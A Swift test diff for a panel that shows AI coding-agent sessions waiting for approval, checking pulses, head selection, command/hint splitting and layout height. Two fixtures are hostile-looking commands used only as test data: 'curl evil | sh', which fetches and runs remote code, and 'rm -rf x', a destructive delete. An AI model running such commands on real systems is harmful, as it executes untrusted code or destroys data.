@@ -67,15 +67,33 @@ import Testing
     }
 
     @Test func enteringNeedsYouFailedOrDonePulses() {
-        for status in [SessionStatus.waiting, .failed, .done] {
-            #expect(Panel.pulses(from: nil, to: status))
-            #expect(Panel.pulses(from: .running, to: status))
-            #expect(!Panel.pulses(from: status, to: status), "staying \(status) does not pulse again")
+        func pulses(_ a: SessionStatus?, _ b: SessionStatus?, source: String = "claude-code") -> Bool {
+            Panel.pulses(from: a.map { session("s", $0, source: source) }, to: b.map { session("s", $0, source: source) })
         }
-        #expect(!Panel.pulses(from: nil, to: .running))
-        #expect(!Panel.pulses(from: .waiting, to: .running))
-        #expect(!Panel.pulses(from: .done, to: .idle))
-        #expect(!Panel.pulses(from: .done, to: nil))
+        for status in [SessionStatus.waiting, .failed, .done] {
+            #expect(pulses(nil, status))
+            #expect(pulses(.running, status))
+            #expect(!pulses(status, status), "staying \(status) does not pulse again")
+            #expect(!pulses(.running, status, source: "hermes"), "Hermes is not in the panel")
+        }
+        #expect(!pulses(nil, .running))
+        #expect(!pulses(.waiting, .running))
+        #expect(!pulses(.done, .idle))
+        #expect(!pulses(.done, nil))
+    }
+
+    @Test func theHeadIsTheFirstSessionThatNeedsYou() {
+        let old = session("old", .waiting, since: 1)
+        let asking = session("asking", .waiting, since: 5)
+        let request = Item(id: "r", title: "npm test", kind: .request, status: .waiting, meta: ["session_id": "asking"])
+        let loose = Item(id: "x", title: "curl evil | sh", kind: .request, status: .waiting)
+        let panel = Panel(sessions: [session("run", .running), asking, old], requests: [loose, request])
+        // ⌥⇧O goes to the longest waiting session; ⌥⇧A / ⌥⇧D answer the first request the panel shows.
+        #expect(panel.headSession?.id == "old")
+        #expect(panel.headRequest?.id == "r")
+        // A request the panel does not show (no session) is never the head.
+        #expect(Panel(sessions: [session("run", .running)], requests: [loose]).headRequest == nil)
+        #expect(Panel(sessions: [session("run", .running)]).headSession == nil)
     }
 }
 
@@ -122,13 +140,62 @@ import Testing
 }
 
 @Suite struct NeedsYouTests {
+    func waiting(_ detail: String?) -> Session {
+        var s = Session(id: "s1", source: "claude-code", title: "perch")
+        s.status = .waiting
+        s.detail = detail
+        return s
+    }
+
     @Test func theCommandAndWhereToAnswerSplitApart() {
         let heredoc = "cat <<EOF > notes.txt\nline one\nEOF"
-        let parts = SessionRow.needsYou(heredoc + "\nAnswer in the terminal: uses shell operators")
-        #expect(parts.text == heredoc && parts.hint == "Answer in the terminal: uses shell operators")
-        #expect(SessionRow.needsYou("npm test\nAnswer in the terminal") == .init(text: "npm test", hint: "Answer in the terminal"))
-        // Allowlisted (a request carries the buttons) or a question: nothing to split.
-        #expect(SessionRow.needsYou("npm test") == .init(text: "npm test", hint: nil))
-        #expect(SessionRow.needsYou("Which database?") == .init(text: "Which database?", hint: nil))
+        let parts = SessionRow.needsYou(waiting(heredoc + "\nAnswer in the terminal: uses shell operators"), request: nil)
+        #expect(parts == .init(text: heredoc, hint: "Answer in the terminal: uses shell operators", isCommand: true))
+        #expect(SessionRow.needsYou(waiting("npm test\nAnswer in the terminal"), request: nil)
+                == .init(text: "npm test", hint: "Answer in the terminal", isCommand: true))
+        // A question: shown as the agent asked it.
+        #expect(SessionRow.needsYou(waiting("Which database?"), request: nil) == .init(text: "Which database?", hint: nil, isCommand: false))
+        #expect(SessionRow.needsYou(waiting(nil), request: nil).text == "Waiting for your answer")
+    }
+
+    @Test func withARequestTheRowShowsWhatAllowAnswers() {
+        // The session's detail moved on (a question came in) while the request is still open:
+        // Allow must sit under the command it approves.
+        let request = Item(title: "npm test -- --coverage", kind: .request, status: .waiting, meta: ["session_id": "s1"])
+        #expect(SessionRow.needsYou(waiting("Which database?"), request: request)
+                == .init(text: "npm test -- --coverage", hint: nil, isCommand: true))
+    }
+}
+
+@Suite struct PanelLayoutTests {
+    func session(_ id: String, _ status: SessionStatus, detail: String? = nil) -> Session {
+        var s = Session(id: id, source: "claude-code", title: id)
+        s.status = status
+        s.detail = detail
+        return s
+    }
+
+    @Test func heightGrowsWithGroupsRowsAndLongCommands() {
+        let empty = PanelLayout.listHeight(Panel(sessions: []))
+        #expect(empty == PanelLayout.messageHeight)
+        let one = PanelLayout.listHeight(Panel(sessions: [session("a", .running)]))
+        #expect(one == PanelLayout.headerHeight + PanelLayout.rowHeight)
+        let two = PanelLayout.listHeight(Panel(sessions: [session("a", .running), session("b", .running)]))
+        #expect(two == one + PanelLayout.rowHeight)
+        let groups = PanelLayout.listHeight(Panel(sessions: [session("a", .running), session("b", .done)]))
+        #expect(groups == two + PanelLayout.headerHeight)
+
+        let short = PanelLayout.listHeight(Panel(sessions: [session("w", .waiting, detail: "npm test")]))
+        let hinted = PanelLayout.listHeight(Panel(sessions: [session("w", .waiting, detail: "rm -rf x\nAnswer in the terminal")]))
+        let long = PanelLayout.listHeight(Panel(sessions: [session("w", .waiting, detail: String(repeating: "x", count: 200))]))
+        #expect(short == one && hinted > short && long > hinted)
+        let request = Item(title: "npm test", kind: .request, status: .waiting, meta: ["session_id": "w"])
+        let buttons = PanelLayout.listHeight(Panel(sessions: [session("w", .waiting, detail: "npm test")], requests: [request]))
+        #expect(buttons == short + PanelLayout.buttonsHeight)
+    }
+
+    @Test func theListScrollsPastTheCap() {
+        let many = Panel(sessions: (0..<40).map { session("s\($0)", .running) })
+        #expect(PanelLayout.listHeight(many) == PanelLayout.maxListHeight)
     }
 }
